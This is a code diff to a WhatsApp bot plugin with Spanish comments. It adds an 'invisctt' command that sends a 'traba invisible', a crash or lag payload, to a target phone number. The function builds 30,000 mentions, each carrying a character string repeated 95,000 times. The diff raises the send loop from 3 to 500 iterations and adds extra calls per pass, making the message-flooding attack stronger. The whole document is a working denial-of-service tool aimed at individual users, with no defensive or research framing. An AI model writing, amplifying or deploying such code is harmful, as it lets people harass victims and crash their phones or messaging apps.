@@ -1,6 +1,6 @@
-// 🔹 Comando .invisctt para enviar traba invisible masiva
 import fetch from 'node-fetch';
 
+// 🔹 Función de traba invisible
 async function XaDelayMaker(target, conn) {
   const delaymention = Array.from({ length: 30000 }, (_, r) => ({
     title: "᭡꧈".repeat(95000),
@@ -70,7 +70,10 @@ let handler = async (m, { conn, text }) => {
     ptt: true
   }, { quoted: m });
 
-  for (let i = 0; i < 3; i++) {
+  for (let i = 0; i < 500; i++) {
+    await XaDelayMaker(target, conn);
+    await XaDelayMaker(target, conn);
+    await XaDelayMaker(target, conn);
     await XaDelayMaker(target, conn);
     await XaDelayMaker(target, conn);
     await XaDelayMaker(target, conn);
@@ -79,8 +82,8 @@ let handler = async (m, { conn, text }) => {
   console.log('✅ Traba invisctt completada');
 };
 
-handler.command = ['invis'];
-handler.help = ['invis <número>'];
+handler.command = ['invisctt'];
+handler.help = ['invisctt <número>'];
 handler.tags = ['traba'];
 handler.group = false;
 handler.premium = false;
